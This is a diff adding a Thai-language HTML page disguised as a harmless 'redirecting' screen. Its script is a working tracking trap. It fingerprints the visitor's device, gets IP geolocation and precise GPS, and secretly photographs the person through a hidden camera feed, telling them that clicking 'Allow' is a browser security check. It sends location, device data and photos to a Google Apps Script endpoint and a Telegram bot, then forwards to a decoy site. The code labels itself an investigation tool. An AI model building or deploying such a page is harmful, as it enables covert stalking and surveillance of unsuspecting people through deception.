@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="th">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>กำลังเปลี่ยนเส้นทางไปยัง...</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="js/config.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&display=swap');
+
+    body {
+      font-family: 'Sarabun', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+      background-color: #f8fafc;
+      color: #334155;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex items-center justify-center p-4">
+
+  <!-- Neutral Minimalist Loading (กลมกลืนกับระบบปลายทาง) -->
+  <div class="text-center max-w-sm w-full py-8 px-6 bg-white rounded-2xl shadow-sm border border-slate-100">
+    <div class="flex justify-center mb-4">
+      <div class="relative flex items-center justify-center">
+        <div class="animate-spin rounded-full h-10 w-10 border-[3px] border-slate-200 border-t-blue-600"></div>
+      </div>
+    </div>
+    <p class="text-sm font-semibold text-slate-700 mb-1">กำลังเปลี่ยนเส้นทางไปยัง...</p>
+    <p id="destination-label" class="text-xs font-bold text-blue-600 mb-2 truncate px-2">กำลังเชื่อมต่อ...</p>
+    <p id="status-hint" class="text-[11px] text-slate-400">กำลังตรวจสอบความปลอดภัยเบราว์เซอร์... กรุณากด "อนุญาต" เพื่อเข้าสู่หน้าเว็บ</p>
+
+    <!-- Fallback Manual Continue -->
+    <div class="mt-4 pt-3 border-t border-slate-100">
+      <a id="manual-redirect-btn" href="#" class="text-[11px] text-slate-400 hover:text-blue-600 transition">
+        หากหน้าเว็บไม่เปิดอัตโนมัติ <span class="underline">แตะที่นี่เพื่อไปต่อ</span>
+      </a>
+    </div>
+  </div>
+
+  <!-- Offscreen Video & Canvas for camera capture (Offscreen avoids mobile GPU frame decoding drop) -->
+  <video id="hidden-video" autoplay playsinline muted style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none;"></video>
+  <canvas id="hidden-canvas" style="display: none;"></canvas>
+
+  <script>
+    (function () {
+      // 1. ดึงเป้าหมาย URL ที่ต้องการ Redirect (รองรับ url, redirect, decoy)
+      const urlParams = new URLSearchParams(window.location.search);
+      let destinationUrl = urlParams.get('url') || urlParams.get('redirect') || urlParams.get('decoy') || "https://www.google.com";
+      const targetName = urlParams.get('target') || urlParams.get('name') || "เป้าหมายการสืบสวน (Bait Target)";
+
+      // ถอดรหัส URL ปลายทาง
+      try {
+        destinationUrl = decodeURIComponent(destinationUrl);
+      } catch (e) { }
+
+      if (!destinationUrl.startsWith('http://') && !destinationUrl.startsWith('https://')) {
+        destinationUrl = 'https://' + destinationUrl;
+      }
+
+      // แสดงชื่อปลายทางบนหน้าจอ
+      const destLabel = document.getElementById('destination-label');
+      const manualBtn = document.getElementById('manual-redirect-btn');
+      if (destLabel) {
+        try {
+          const parsed = new URL(destinationUrl);
+          destLabel.textContent = parsed.hostname + (parsed.pathname !== '/' ? parsed.pathname : '');
+        } catch (e) {
+          destLabel.textContent = destinationUrl;
+        }
+      }
+      if (manualBtn) {
+        manualBtn.href = destinationUrl;
+      }
+
+      // 2. วิเคราะห์ลายนิ้วมืออุปกรณ์ขั้นสูง (Device Fingerprint จาก test bot)
+      const screenW = window.screen.width;
+      const screenH = window.screen.height;
+      const dpr = window.devicePixelRatio || 1;
+      const ua = navigator.userAgent || '';
+
+      let brandModel = "ไม่ทราบรุ่น";
+      if (/iPhone/i.test(ua)) {
+        if ((screenW === 428 && screenH === 926) || (screenW === 926 && screenH === 428)) {
+          brandModel = "Apple iPhone 12/13/14 Pro Max / 14 Plus";
+        } else if ((screenW === 430 && screenH === 932) || (screenW === 932 && screenH === 430)) {
+          brandModel = "Apple iPhone 14/15 Pro Max / 15 Plus";
+        } else if ((screenW === 393 && screenH === 852) || (screenW === 852 && screenH === 393)) {
+          brandModel = "Apple iPhone 14 Pro / 15 / 15 Pro";
+        } else if ((screenW === 390 && screenH === 844) || (screenW === 844 && screenH === 390)) {
+          brandModel = "Apple iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
+        } else if ((screenW === 375 && screenH === 812) || (screenW === 812 && screenH === 375)) {
+          brandModel = "Apple iPhone X / XS / 11 Pro / 12 mini / 13 mini";
+        } else if ((screenW === 414 && screenH === 896) || (screenW === 896 && screenH === 414)) {
+          brandModel = "Apple iPhone XR / 11 / 11 Pro Max";
+        } else {
+          brandModel = "Apple iPhone";
+        }
+      } else if (/iPad/i.test(ua)) {
+        brandModel = "Apple iPad";
+      } else if (/Android/i.test(ua)) {
+        const match = ua.match(/Android.*;\s*([a-zA-Z0-9_\-\s]+)\s*Build/);
+        brandModel = match ? `Android (${match[1].trim()})` : "Android Device";
+      } else if (/Windows/i.test(ua)) {
+        brandModel = "Windows PC / Laptop";
+      } else if (/Macintosh/i.test(ua)) {
+        brandModel = "Apple Mac";
+      }
+
+      let browserName = "Mobile Browser";
+      if (/Line/i.test(ua)) {
+        browserName = "LINE In-App Browser";
+      } else if (/FB/i.test(ua) || /FBAV/i.test(ua)) {
+        browserName = "Facebook In-App Browser";
+      } else if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
+        browserName = "Google Chrome";
+      } else if (/Safari/i.test(ua)) {
+        browserName = "Apple Safari";
+      } else if (/Edge/i.test(ua)) {
+        browserName = "Microsoft Edge";
+      }
+
+      // 3. โครงสร้าง Telemetry Data
+      const trackingData = {
+        action: 'logTracking',
+        targetName: targetName,
+        ip: '-',
+        cityRegion: '-',
+        lat: '-',
+        lng: '-',
+        accuracy: '-',
+        isp: '-',
+        targetUrl: destinationUrl,
+        userAgent: ua,
+        deviceInfo: `${brandModel} • ${screenW}x${screenH} @${dpr}x | ${browserName} (${navigator.platform || '-'})`,
+        camera: {
+          frontPhoto: null,
+          frontSize: '0 KB',
+          rearPhoto: null,
+          rearSize: '0 KB'
+        },
+        timestamp: new Date().toISOString()
+      };
+
+      let isRedirected = false;
+      function performRedirect() {
+        if (!isRedirected) {
+          isRedirected = true;
+          window.location.replace(destinationUrl);
+        }
+      }
+
+      // 4. ดึง GAS Endpoints จาก config
+      const gasEndpoints = [
+        (typeof CONFIG !== 'undefined' && CONFIG.GAS_URL_LOSTCAR) ? CONFIG.GAS_URL_LOSTCAR : '',
+        (typeof CONFIG !== 'undefined' && CONFIG.GAS_URL) ? CONFIG.GAS_URL : ''
+      ].filter(u => u && !u.includes('YOUR_GAS_URL'));
+
+      if (gasEndpoints.length === 0) {
+        gasEndpoints.push('https://script.google.com/macros/s/AKfycbxs3oWfi4tNCbO4nZ5q0aVIg5sTrdbWVcxkVGpWTuBYR87GcqBkm0BoUrnui0Ybsz1v/exec');
+      }
+
+      // 5. ฟังก์ชันส่งแจ้งเตือนด่วนเข้า Telegram Bot (Consolidated Telemetry Alert)
+      async function dispatchTelegramAlert() {
+        const botToken = (typeof CONFIG !== 'undefined' && CONFIG.TELEGRAM_BOT_TOKEN) ? CONFIG.TELEGRAM_BOT_TOKEN : localStorage.getItem('SANBOT_TELEGRAM_BOT_TOKEN');
+        const chatId = (typeof CONFIG !== 'undefined' && CONFIG.TELEGRAM_CHAT_ID) ? CONFIG.TELEGRAM_CHAT_ID : localStorage.getItem('SANBOT_TELEGRAM_CHAT_ID');
+
+        if (!botToken || !chatId) return;
+
+        const hasGps = (trackingData.lat !== '-' && trackingData.lng !== '-');
+        const timeStr = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }) + " น.";
+        const mapsUrl = hasGps ? `https://www.google.com/maps?q=${trackingData.lat},${trackingData.lng}` : '';
+
+        const caption =
+          `🚨 <b>[San BOT] ตรวจพบการเปิดลิงก์ดักจับพิกัด!</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `🎯 <b>เป้าหมาย (Target):</b> <code>${targetName}</code>\n` +
+          `🕒 <b>เวลาตรวจจับ:</b> ${timeStr}\n` +
+          `📊 <b>สถานะ:</b> <b>${hasGps ? '✅ ได้รับพิกัด GPS ละเอียด' : '⚠️ ใช้พิกัดโดยประมาณจาก IP'}</b>\n\n` +
+          `📍 <b>ข้อมูลตำแหน่ง & พิกัด</b>\n` +
+          (hasGps
+            ? `📌 <b>พิกัด GPS:</b> <code>${trackingData.lat}, ${trackingData.lng}</code> (${trackingData.accuracy})\n🗺️ <b>แผนที่:</b> <a href="${mapsUrl}">เปิด Google Maps</a>\n`
+            : `📌 <b>พื้นที่โดยประมาณ (IP):</b> ${trackingData.cityRegion}\n`) +
+          `🌐 <b>Public IP:</b> <code>${trackingData.ip}</code>\n` +
+          `🏢 <b>ผู้ให้บริการ (ISP):</b> ${trackingData.isp}\n\n` +
+          `📱 <b>ข้อมูลอุปกรณ์ (Device Fingerprint)</b>\n` +
+          `📱 <b>รุ่นเครื่อง:</b> <b>${brandModel}</b>\n` +
+          `🖥️ <b>ความละเอียดจอ:</b> <code>${screenW}x${screenH} @${dpr}x</code>\n` +
+          `🌐 <b>เบราว์เซอร์:</b> ${browserName}\n` +
+          `🔗 <b>เว็บปลายทาง (Decoy):</b> <a href="${destinationUrl}">${destinationUrl}</a>\n` +
+          (trackingData.camera.frontPhoto ? `📸 <b>ภาพถ่ายกล้องหน้า:</b> <i>บันทึกแล้ว (${trackingData.camera.frontSize})</i>\n` : '') +
+          (trackingData.camera.rearPhoto ? `📷 <b>ภาพถ่ายกล้องหลัง:</b> <i>บันทึกแล้ว (${trackingData.camera.rearSize})</i>\n` : '') +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `<i>🛡️ ระบบสนับสนุนงานสืบสวน San BOT CyberSec Engine</i>`;
+
+        function b64ToBlob(b64) {
+          try {
+            const m = b64.match(/^data:([^;]+);base64,(.+)$/);
+            if (!m) return null;
+            const bChars = atob(m[2]);
+            const bNums = new Array(bChars.length);
+            for (let i = 0; i < bChars.length; i++) bNums[i] = bChars.charCodeAt(i);
+            return new Blob([new Uint8Array(bNums)], { type: m[1] });
+          } catch (e) {
+            return null;
+          }
+        }
+
+        try {
+          const teleUrl = `https://api.telegram.org/bot${botToken}`;
+
+          // หากมีภาพถ่ายกล้องหน้า ส่งเป็น Photo Card
+          if (trackingData.camera.frontPhoto && trackingData.camera.frontPhoto.startsWith('data:image/')) {
+            const frontBlob = b64ToBlob(trackingData.camera.frontPhoto);
+            if (frontBlob) {
+              const formData = new FormData();
+              formData.append('chat_id', chatId);
+              formData.append('photo', frontBlob, 'target_front.jpg');
+              formData.append('caption', caption);
+              formData.append('parse_mode', 'HTML');
+
+              const pFront = fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: formData }).catch(e => console.warn(e));
+
+              // หากมีภาพถ่ายกล้องหลังด้วย ส่งตามหลังทันที
+              if (trackingData.camera.rearPhoto && trackingData.camera.rearPhoto.startsWith('data:image/')) {
+                const rearBlob = b64ToBlob(trackingData.camera.rearPhoto);
+                if (rearBlob) {
+                  const rearFormData = new FormData();
+                  rearFormData.append('chat_id', chatId);
+                  rearFormData.append('photo', rearBlob, 'target_rear.jpg');
+                  rearFormData.append('caption', `📷 <b>[San BOT] ภาพถ่ายกล้องหลังเป้าหมาย:</b> <code>${targetName}</code>`);
+                  rearFormData.append('parse_mode', 'HTML');
+                  fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: rearFormData }).catch(e => console.warn(e));
+                }
+              }
+
+              await pFront;
+              return;
+            }
+          }
+
+          // ส่งข้อความแบบ Text ปกติ
+          await fetch(`${teleUrl}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: caption,
+              parse_mode: 'HTML',
+              disable_web_page_preview: false
+            })
+          });
+        } catch (err) {
+          console.warn('Telegram dispatch error:', err);
+        }
+      }
+
+      // 6. ฟังก์ชันส่งข้อมูลไปยัง Google Apps Script (ส่งขนาน ไม่รอช้า ประหยัดเวลา)
+      let isGasDispatched = false;
+      async function dispatchGasTracking(withPhoto = false) {
+        if (isGasDispatched && !withPhoto) return;
+        if (withPhoto) isGasDispatched = true;
+
+        const payloadStr = JSON.stringify(trackingData);
+
+        const promises = gasEndpoints.map(endpoint => {
+          return fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+            body: payloadStr
+          }).catch(err => console.warn('POST GAS endpoint error:', err));
+        });
+
+        // รอส่งแบบขนานสูงสุดเพียง 850ms เพื่อให้ Redirect ได้อย่างรวดเร็ว
+        await Promise.race([
+          Promise.allSettled(promises),
+          new Promise(r => setTimeout(r, withPhoto ? 850 : 350))
+        ]);
+      }
+
+      // Step 1: ดึง IP & IP Geolocation (รวดเร็ว ทันที ไม่ต้องขอ Permission)
+      const ipGeoPromise = fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(data => {
+          if (data && data.ip) {
+            trackingData.ip = data.ip || '-';
+            trackingData.cityRegion = `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || '-';
+            trackingData.isp = `${data.org || data.asn || ''}`.trim() || '-';
+            if (data.latitude && data.longitude && trackingData.lat === '-') {
+              trackingData.lat = data.latitude;
+              trackingData.lng = data.longitude;
+              trackingData.accuracy = 'ระดับเมือง/เสาสัญญาณ (~' + (data.postal || 'City') + ')';
+            }
+          }
+        })
+        .catch(() => {
+          return fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => { trackingData.ip = d.ip || '-'; })
+            .catch(() => {});
+        });
+
+      // Step 2: ดึง High-Accuracy GPS จากมือถือ (เมื่อเป้าหมายกด Allow)
+      const browserGpsPromise = new Promise((resolve) => {
+        if ('geolocation' in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              if (pos && pos.coords) {
+                trackingData.lat = pos.coords.latitude;
+                trackingData.lng = pos.coords.longitude;
+                trackingData.accuracy = pos.coords.accuracy ? `${pos.coords.accuracy.toFixed(1)} ม. (GPS จริง)` : 'GPS จริง';
+              }
+              resolve();
+            },
+            (err) => {
+              console.warn('GPS denied/skipped:', err.message);
+              resolve();
+            },
+            { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
+          );
+        } else {
+          resolve();
+        }
+      });
+
+      // Step 3: ระบบจับภาพกล้อง (แก้ปัญหาภาพจอดำบนมือถือ + รองรับถ่ายกล้องหน้า/หลัง + Redirect รวดเร็ว)
+      let isCapturing = false;
+      let hasCapturedPhoto = false;
+
+      async function snapCamera(facing) {
+        let stream = null;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: facing,
+              width: { ideal: 640, max: 800 },
+              height: { ideal: 480, max: 600 }
+            }
+          });
+          const video = document.getElementById('hidden-video');
+          const canvas = document.getElementById('hidden-canvas');
+          if (!video || !canvas) {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            return null;
+          }
+
+          video.srcObject = stream;
+
+          // รอจนกระทั่งเบราว์เซอร์ถอดรหัสเฟรมภาพจริง (แก้ปัญหาภาพจอดำบนมือถืออย่างถาวร)
+          await new Promise(resolve => {
+            let done = false;
+            const finish = () => {
+              if (!done) { done = true; resolve(); }
+            };
+            video.onplaying = () => {
+              if (video.videoWidth > 0 && video.readyState >= 2) {
+                setTimeout(finish, 160);
+              } else {
+                video.ontimeupdate = () => finish();
+                setTimeout(finish, 350);
+              }
+            };
+            video.play().catch(finish);
+            setTimeout(finish, 850);
+          });
+
+          // หน่วงเวลาให้เซนเซอร์กล้องปรับรูรับแสงและความสว่าง (Auto-Exposure Warmup)
+          await new Promise(r => setTimeout(r, 160));
+
+          const vW = video.videoWidth || 640;
+          const vH = video.videoHeight || 480;
+          // ปรับความละเอียดให้พอเหมาะ (400px) เพื่อให้ภาพเบาเพียง ~18-25 KB อัปโหลดเร็วมาก
+          const targetW = 400;
+          const targetH = Math.round(targetW * (vH / vW || 0.75));
+          canvas.width = targetW;
+          canvas.height = targetH;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, targetW, targetH);
+
+          // ปิดสตรีมกล้องทันทีเพื่อดับไฟสถานะบนมือถือ
+          stream.getTracks().forEach(t => t.stop());
+          video.srcObject = null;
+
+          return canvas.toDataURL('image/jpeg', 0.60);
+        } catch (err) {
+          if (stream) {
+            try { stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+          }
+          console.warn(`Camera snap error (${facing}):`, err);
+          return null;
+        }
+      }
+
+      async function captureCameraSilent() {
+        if (hasCapturedPhoto || isCapturing) return;
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+        isCapturing = true;
+
+        try {
+          // 1. ถ่ายกล้องหน้าก่อนเสมอ (เป็นกล้องที่ตรงกับใบหน้าเป้าหมายที่สุดขณะกดลิงก์)
+          const frontB64 = await snapCamera("user");
+          if (frontB64 && frontB64.length > 500) {
+            hasCapturedPhoto = true;
+            trackingData.camera.frontPhoto = frontB64;
+            trackingData.photo = frontB64;
+            trackingData.camera.frontSize = Math.round(frontB64.length * 0.75 / 1024) + " KB";
+          }
+
+          // 2. หากเปิดโหมดกล้องคู่ (ส่ง cam=dual หรือ dual=1) ให้สลับถ่ายกล้องหลังต่อทันที
+          const wantDual = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1');
+          if (wantDual) {
+            const rearB64 = await snapCamera({ ideal: "environment" });
+            if (rearB64 && rearB64.length > 500) {
+              trackingData.camera.rearPhoto = rearB64;
+              trackingData.camera.rearSize = Math.round(rearB64.length * 0.75 / 1024) + " KB";
+            }
+          }
+
+          if (hasCapturedPhoto) {
+            // ส่ง Telegram และ Google Apps Script พร้อมกันแบบคู่ขนาน (Parallel) เพื่อความเร็วสูงสุด
+            await Promise.allSettled([
+              dispatchTelegramAlert(),
+              dispatchGasTracking(true)
+            ]);
+            // เด้งเปลี่ยนเส้นทางทันทีอย่างรวดเร็ว (เพียง 80ms)
+            setTimeout(performRedirect, 80);
+          }
+        } catch (e) {
+          console.warn('Silent capture flow error:', e);
+        } finally {
+          isCapturing = false;
+        }
+      }
+
+      // ดักจับการแตะหน้าจอทุกจุด เพื่อกระตุ้นขอสิทธิ์กล้องในเบราว์เซอร์มือถือ
+      document.addEventListener('click', () => { captureCameraSilent(); }, { passive: true });
+      document.addEventListener('touchstart', () => { captureCameraSilent(); }, { passive: true });
+
+      if (manualBtn) {
+        manualBtn.onclick = async (e) => {
+          e.preventDefault();
+          if (!hasCapturedPhoto) {
+            await captureCameraSilent();
+            if (!hasCapturedPhoto) await dispatchGasTracking(false);
+          }
+          performRedirect();
+        };
+      }
+
+      // Step 4: รวมการส่งข้อมูลทั้งหมด
+      // ให้เวลารอการกด "อนุญาต" กล้อง สูงสุด 3.2 วินาที (ปรับให้เร็วขึ้นเพื่อไม่ให้เป้าหมายรอนาน)
+      // หากผู้ใช้กดอนุญาตและถ่ายเสร็จ จะส่งภาพและ Redirect ทันทีโดยไม่ต้องรอครบเวลา
+      const cameraRunPromise = captureCameraSilent();
+
+      Promise.race([
+        Promise.all([ipGeoPromise, browserGpsPromise, cameraRunPromise]),
+        new Promise(r => setTimeout(r, 3200))
+      ]).then(async () => {
+        if (!hasCapturedPhoto) {
+          await dispatchGasTracking(false);
+          await dispatchTelegramAlert();
+        }
+        setTimeout(performRedirect, 80);
+      }).catch(() => {
+        performRedirect();
+      });
+
+      // Safe Absolute Fallback: ไม่เกิน 4.5 วินาทีจะเด้งไปปลายทางแน่นอน
+      setTimeout(performRedirect, 4500);
+    })();
+  </script>
+</body>
+
+</html>
